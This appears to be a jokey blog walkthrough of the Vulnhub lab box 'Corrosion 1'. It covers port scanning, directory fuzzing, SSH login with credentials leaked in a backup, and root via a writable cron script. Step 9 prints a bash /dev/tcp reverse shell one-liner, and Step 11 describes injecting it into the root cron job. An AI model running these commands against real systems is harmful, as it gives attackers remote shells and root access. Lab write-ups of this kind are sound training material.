> ⚠️ **Spoiler alert:** This walkthrough contains humor, caffeine, and hacking.

## 🧠 Introduction

**Corrosion 1** on Vulnhub — a rusty Linux box that hides its secrets better than I hide snacks from my roommates.  
The goal? Get two flags — *user* and *root*.  
The method? Scan, poke, fuzz, escalate, and pray nothing breaks (except maybe Randy’s password).

---

## 🛰️ Step 1: Network Discovery

The hunt begins! We need the target IP before we can cause any “ethical chaos.”  
Let’s unleash our digital bloodhound — `netdiscover`.

```bash
sudo netdiscover -r 192.168.1.0/24
````

![Netdiscover Results](/assets/img/vulnhub/Corrosion_1/netdiscover_result.png)

🎯 Target found! The IP looks like it’s hiding something sinister… or just running Apache.

---

## 🔦 Step 2: Port Scanning with Nmap

Time for our favorite noisy friend — `nmap`. Because guessing open ports is for amateurs.

```bash
nmap -sC -sV -p- 192.168.1.14
```

![Nmap Results](/assets/img/vulnhub/Corrosion_1/nmap_results.png)

We see **port 22 (SSH)** and **port 80 (HTTP)** open.
The HTTP service screams “please fuzz me.”

---

## 🌐 Step 3: Web Exploration

Visiting the website gives us a simple blog. Nothing too fancy, but hackers know — plain sites often hide spicy secrets.

![Blog Page](/assets/img/vulnhub/Corrosion_1/blog-page.png)

The homepage was cleaner than my resume. So, we dive into **/archives** next.

![Archives Page](/assets/img/vulnhub/Corrosion_1/archives_page.png)

Still nothing obvious, but remember: the quiet ones always hide the best stuff.

---

## 🏗️ Step 4: Fuzzing for Hidden Directories

If you ever feel lost, remember — **Gobuster** never does.

```bash
gobuster dir -u http://192.168.1.14 -w /usr/share/wordlists/dirb/common.txt
```

![Gobuster Fuzz](/assets/img/vulnhub/Corrosion_1/gobuster_fuzz.png)

Soon enough…

![Gobuster Results](/assets/img/vulnhub/Corrosion_1/gobuster_results.png)

…and more fuzzing magic.

![Gobuster Fuzz Result](/assets/img/vulnhub/Corrosion_1/gobuster_fuzz_result.png)

We discover directories like `/backup` and `/tasks`. Jackpot!

---

## 📦 Step 5: Investigating the Backup

The `/backup` directory gives us a `.zip` or `.bak` file (because apparently, nobody told admins about `.gitignore`).

![Backup File](/assets/img/vulnhub/Corrosion_1/backup_file.png)

After downloading and unzipping it, we find… credentials!

![My Password](/assets/img/vulnhub/Corrosion_1/my_password.png)

Looks like a username and password for “Randy.”
Ah yes, Randy — the digital equivalent of “password123” guy.

---

## 🧩 Step 6: Checking Task Lists and Clues

Peeking into `/tasks` page, we see the developer left some helpful breadcrumbs.

![Tasks](/assets/img/vulnhub/Corrosion_1/tasks.png)
![Tasks List](/assets/img/vulnhub/Corrosion_1/tasks_list.png)

The notes indicate backup automation and references to old logs. A trail of digital breadcrumbs to follow.

---

## 🔐 Step 7: SSH Login as Randy

Armed with Randy’s credentials, we go for SSH.

```bash
ssh randy@192.168.1.14
```

![Randy Login](/assets/img/vulnhub/Corrosion_1/randy_login.png)

🎉 And… we’re in!
The sweet sound of the terminal welcoming us.
Randy, my friend, you’ve left your door wide open.

---

## 🕵️ Step 8: Peeking Around as Randy

Naturally, we go snooping around Randy’s home folder.
Hidden notes? Suspicious scripts? Weird lunch reminders?

We also inspect `/var/log/auth.log` for interesting logins.

![Auth Log](/assets/img/vulnhub/Corrosion_1/auth_log.png)

Seems there’s a cron job or script running frequently — hinting at privilege escalation potential.

---

## 💥 Step 9: Getting Shell Access (Reverse Shell)

While exploring, we set up a reverse shell for better control (and because typing single commands over SSH is boring).

```bash
bash -i >& /dev/tcp/192.168.1.5/4444 0>&1
```

![Get Shell](/assets/img/vulnhub/Corrosion_1/get_shell.png)

Connection received! We now have a shell that obeys without question — the dream of every sysadmin turned evil.

---

## 🧰 Step 10: Privilege Escalation – Enumeration

Before we go full “root,” let’s analyze the system with **LinPEAS** — the green scroll of destiny.

![LinPEAS Output](/assets/img/vulnhub/Corrosion_1/linpeas.png)

It points out a writable script and potential misconfiguration.
A small tweak here, a sneaky command there, and we’re almost home.

---

## ⚙️ Step 11: Exploit Misconfigurations

We find a suspicious backup or cron-related script that runs as root.
If we insert our reverse shell into it, we might get a root session.

![Backup Script Discovery](/assets/img/vulnhub/Corrosion_1/searchsploit_results.png)

We also double-check with **SearchSploit** for any known vulnerabilities related to the system version.

![Searchsploit Results](/assets/img/vulnhub/Corrosion_1/searchsploit_results.png)

Sometimes, old software is a hacker’s best friend.

---

## 🧑‍💻 Step 12: System Recon & Proof of Concept

Before execution, we analyze system processes and tasks.

![Fuzzing Attempt](/assets/img/vulnhub/Corrosion_1/fuzzing.png)
![System Tasks Page](/assets/img/vulnhub/Corrosion_1/Screenshot 2025-11-11 160645.png)

We confirm the vulnerable script path, modify it with our payload, and wait for cron to do its thing.

---

## 👑 Step 13: Root Access Achieved

And then… magic!
The cron executes our injected shell, giving us **root** privileges.

![Root Flag](/assets/img/vulnhub/Corrosion_1/root_flag.png)

`whoami` now proudly says `root`.
Somewhere, Randy sheds a tear.

---

## 🧾 Step 14: Capture the User Flag

First things first — we grab the **user.txt**.

![User Flag](/assets/img/vulnhub/Corrosion_1/user_flag.png)

We read it like poetry. Short, powerful, and proof of victory (phase one).

---

## 🧱 Step 15: Capture the Root Flag

Finally, in `/root/`, lies the ultimate reward.

Mission complete. I may not have saved the world, but I sure owned Randy’s server.

## 🧃 Conclusion

**Corrosion 1** was like peeling a rusty onion — every layer made me cry, but the root was totally worth it.
This machine taught:

* Enumeration patience 🕵️‍♂️
* Password hygiene (Randy, take notes)
* Cron exploitation 🧙‍♂️
* The joy of seeing `whoami: root` 💀

> 💡 *Moral of the story:* Backups and crons are like unguarded cookies — delicious, but dangerous.

---

**Final Words:**
If you made it this far — congrats, you’re officially corroded (in a good way).
Now go hydrate, touch some grass, and maybe change your passwords.
